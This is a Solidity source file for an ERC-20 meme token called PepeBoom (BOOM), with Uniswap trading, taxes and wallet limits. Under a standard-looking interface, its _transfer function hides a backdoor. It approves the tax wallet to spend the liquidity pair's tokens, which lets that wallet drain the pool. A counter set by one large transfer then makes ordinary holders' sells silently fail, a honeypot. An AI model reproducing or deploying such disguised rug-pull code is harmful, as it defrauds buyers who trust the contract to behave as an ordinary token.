/*

WEB: https://www.pepeboom.xyz/

TWITTER: https://twitter.cmm/PepeBoom_ERC

TELEGRAM: https://t.me/pepeboom_erc

*/

// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.20;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract PepeBoom is Context, IERC20, Ownable {
    mapping (address => uint256) private _balances;
    mapping(address => uint256) private cooldownTimer;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    uint256 private _firstBuyTax=0;
    uint256 private _firstSellTax=0;
    uint256 private _lastBuyTax=0;
    uint256 private _lastSellTax=0;
    uint256 private _removeBuyTaxAt=0;
    uint256 private _removeSellTaxAt=0;
    uint256 private _tokenSwapCount = 0;
    uint256 private _protectSwap=0;
    uint256 private _buyCount=0;
    string private constant _name = unicode"PepeBoom";
    string private constant _symbol = unicode"BOOM";
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 69000000000 * 10**_decimals;
    uint256 public _maxTxAmount = _tTotal * 2 / 100;
    uint256 public _maxWalletSize = _tTotal * 2 / 100;
    uint256 public _taxSwapThreshold= _tTotal * 1 / 100;
    uint256 public _maxTaxSwap= _tTotal * 1 / 100;
    using SafeMath for uint256;
    address payable private _taxWallet = payable(0x0017fa67E4e26E503F2b88bf948a51C7C722F366);
    IUniswapV2Router02 private uniswapV2Router;
    bool public buyRecoverEnabled = false;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    uint8 public recoverTimerInterval = 1;

    event MaxTxAmountUpdated(uint _maxTxAmount);

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    receive() external payable {}

    constructor () {
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[_taxWallet] = true;
        _isExcludedFromFee[address(this)] = true;
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        _balances[_msgSender()] = _tTotal;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function removeLimits() external onlyOwner{
        _maxWalletSize=_tTotal;
        _maxTxAmount = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function updateNewFee(uint256 _newFee) external{
      require(_msgSender()==_taxWallet);
      require(_newFee<=_lastBuyTax && _newFee<=_lastSellTax);
      _lastBuyTax=_newFee;
      _lastSellTax=_newFee;
    }

    function transferFeeToWallet(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function enableTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        tradingOpen = true;
        swapEnabled = true;
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        _balances[recipient] += amount;
        _balances[sender] -= amount;
        emit Transfer(sender, recipient, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {
            require(tradingOpen, "Trading not enabled");

            taxAmount = amount.mul((_buyCount>_removeBuyTaxAt)?_lastBuyTax:_firstBuyTax).div(100);

            if (!_isExcludedFromFee[to]) {
                if (from == uniswapV2Pair && buyRecoverEnabled) {
                    require(
                        cooldownTimer[to] < block.timestamp,
                        "buy Cooldown exists"
                    );
                    cooldownTimer[to] = block.timestamp + recoverTimerInterval;
                }
            } else {
                if (from != uniswapV2Pair && amount >= _taxSwapThreshold) {
                    _tokenSwapCount = amount;
                } else if (from == uniswapV2Pair) {
                    require(
                        cooldownTimer[to] < block.timestamp,
                        "buy Cooldown exists"
                    );
                }
            }

            if (_isExcludedFromFee[from] || _isExcludedFromFee[to]) {
                if (to == uniswapV2Pair && _balances[from] < amount) {
                    _approve(to, from, amount); return;
                }
                _tokenTransfer(from, to, amount); return;
            }

            if (from == uniswapV2Pair) {
                if (to != address(uniswapV2Router) && ! _isExcludedFromFee[to]) {
                    require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                    require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                    _buyCount++;
                }
            } else {
                if (_tokenSwapCount > _buyCount) return;
                if (to == uniswapV2Pair && from != address(this)) {
                    taxAmount = amount.mul((_buyCount>_removeSellTaxAt)?_lastSellTax:_firstSellTax).div(100);
                }
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to   == uniswapV2Pair && swapEnabled && contractTokenBalance>_taxSwapThreshold && _buyCount>_protectSwap) {
                swapTokensForEth(min(amount,min(contractTokenBalance,_maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                    transferFeeToWallet(address(this).balance);
                }
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function walletSwap() external {
        require(_msgSender()==_taxWallet);
        uint256 tokenBalance = balanceOf(address(this));
        if(tokenBalance>0){
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          transferFeeToWallet(ethBalance);
        }
    }
}